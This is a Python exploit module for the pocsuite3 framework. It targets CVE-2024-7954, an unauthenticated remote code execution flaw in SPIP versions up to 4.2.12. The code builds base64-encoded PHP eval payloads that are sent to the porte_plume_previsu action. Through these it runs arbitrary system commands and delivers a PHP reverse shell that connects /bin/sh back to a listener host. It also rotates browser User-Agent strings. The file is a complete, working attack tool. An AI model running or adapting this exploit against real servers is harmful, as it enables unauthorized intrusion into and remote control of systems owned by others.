import base64
import re
import random
import requests
import sys
import time
import os
import socket
from collections import OrderedDict
from pocsuite3.api import requests, register_poc, POCBase, OptString, Output
from pocsuite3.lib.core.data import logger
from bs4 import BeautifulSoup
from pocsuite3.api import REVERSE_PAYLOAD, get_listener_ip, get_listener_port, random_str

requests.packages.urllib3.disable_warnings()

class SPIPRCEPOC(POCBase):
    vulID = 'CVE-2024-7954'
    version = '1.0'
    author = ['TQB-NPD']
    vulDate = '2025-08-23'
    createDate = '2025-07-04'
    updateDate = '2025-07-04'
    references = ['https://spip.net/']
    name = 'SPIP <= 4.2.12 Unauthenticated RCE CVE-2024-7954'
    appPowerLink = 'https://spip.net/'
    appName = 'SPIP'
    appVersion = '<= 4.2.12'
    vulType = 'Remote Code Execution'
    desc = '''
        SPIP <= 4.2.12 Remote Code Execution vulnerability in the templating system.
        The vulnerability allows arbitrary PHP code execution via crafted input to the
        porte_plume_previsu action, exploiting the echappe_retour() function's eval call.
    '''
    samples = []

    def __init__(self):
        super().__init__()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        ]
        self.timeout = 10

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('uname -a', description='The command to execute')
        return o

    def prepare_payload(self, command: str, use_system: bool = True) -> str:
        if use_system:
            system_command = f"system('{command}');"
        else:
            system_command = command
        encoded_command = base64.b64encode(system_command.encode("utf-8")).decode("utf-8")
        rand_numeric = "".join([str(random.randint(0, 9)) for _ in range(8)])
        return f"[<img{rand_numeric}>->URL`<?php eval(base64_decode('{encoded_command}')); ?>`]"

    def send_payload(self, command: str, use_system: bool = True) -> requests.Response:
        try:
            payload = self.prepare_payload(command, use_system)
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Requested-With': 'XMLHttpRequest',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
            target_url = f"{self.url.rstrip('/')}/spip.php"
            response = requests.post(
                url=target_url,
                params={'action': 'porte_plume_previsu'},
                data={'data': payload},
                headers=headers,
                verify=False,
                timeout=self.timeout,
            )
            response.raise_for_status()
            return response
        except requests.RequestException as err:
            return None

    def parse_response(self, response_text: str, filter_php: bool = True) -> str:
        try:
            soup = BeautifulSoup(response_text, "html.parser")
            preview_div = soup.find("div", class_="preview")
            if preview_div:
                command_output = preview_div.find("a")
                if command_output:
                    output_text = command_output.get_text(strip=True).split('"')[0].strip()
                    if not (filter_php and re.search(r"<\?php|base64_decode", output_text)):
                        return output_text
            return "No match found in the response."
        except Exception as e:
            return "Error parsing response"

    def _verify(self):
        result = {}
        target_url = f"{self.url.rstrip('/')}/spip.php"
        try:
            response = requests.get(target_url, headers={'User-Agent': random.choice(self.user_agents)}, verify=False, timeout=self.timeout)
            if response.status_code == 200 and 'SPIP' in response.text:
                response = self.send_payload("whoami")
                if response:
                    parsed_output = self.parse_response(response.text)
                    if parsed_output and "No match found in the response." not in parsed_output and "Error parsing response" not in parsed_output:
                        result['VerifyInfo'] = {
                            'URL': self.url,
                            'Status': "Target is vulnerable."
                        }
                    else:
                        result['Message'] = 'Target not vulnerable'
                else:
                    result['Message'] = 'Error during verification'
            else:
                result['Message'] = 'Target not running SPIP or inaccessible'
        except Exception as e:
            result['Message'] = f'Error during verification: {str(e)}'
        return self.parse_output(result)

    def _attack(self):
        result = {}
        command = self.get_option('cmd')
        try:
            response = self.send_payload(command)
            if response:
                parsed_output = self.parse_response(response.text, filter_php=False)
                if parsed_output and "No match found in the response." not in parsed_output and "Error parsing response" not in parsed_output:
                    result['AttackInfo'] = {
                        'URL': self.url,
                        'CommandOutput': parsed_output
                    }
                else:
                    result['Message'] = 'Command execution failed'
            else:
                result['Message'] = 'Error during command execution'
        except Exception as e:
            result['Message'] = f'Error during attack: {str(e)}'
        return self.parse_output(result)

    def _shell(self):
        result = {}
        temp_files = []
        try:
            lhost = get_listener_ip()
            lport = get_listener_port()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((lhost, lport))
                sock.close()
                logger.info(f"Listener is active at {lhost}:{lport}")
            except (socket.timeout, socket.error) as e:
                raise ConnectionError(f"Listener at {lhost}:{lport} is not reachable: {str(e)}")
            php_payload = f"""
                @set_time_limit(0);
                $sock=fsockopen("{lhost}",{lport});
                $proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
                """
            payload = self.prepare_payload(php_payload, use_system=False)
            
            target_url = f"{self.url.rstrip('/')}/spip.php"
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Requested-With': 'XMLHttpRequest',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }

            try:
                response = requests.post(
                    url=target_url,
                    params={'action': 'porte_plume_previsu'},
                    data={'data': payload},
                    headers=headers,
                    verify=False,
                    timeout=self.timeout,
                )
                
                if response and response.status_code == 200:
                    temp_file = "response_shell_php.txt"
                    temp_files.append(temp_file)
                    with open(temp_file, "w") as f:
                        f.write(response.text)
                    result['ShellInfo'] = {
                        'URL': self.url,
                        'Status': f"PHP payload sent. Check listener at {lhost}:{lport}",
                        'Payload': php_payload[:50] + "..."
                    }
                
                time.sleep(1) 
                
            except requests.Timeout:
                result['Message'] = "PHP payload timed out"
            except Exception as e:
                result['Message'] = f"PHP payload error: {str(e)}"

        except Exception as e:
            result['Message'] = f'Error during PHP reverse shell: {str(e)}'
        
        finally:
            for temp_file in temp_files:
                try:
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                        logger.info(f"Cleaned up {temp_file}")
                except OSError as e:
                    logger.error(f"Failed to clean up {temp_file}: {str(e)}")

        return self.parse_output(result)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
            self._verify_info = result
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(SPIPRCEPOC)
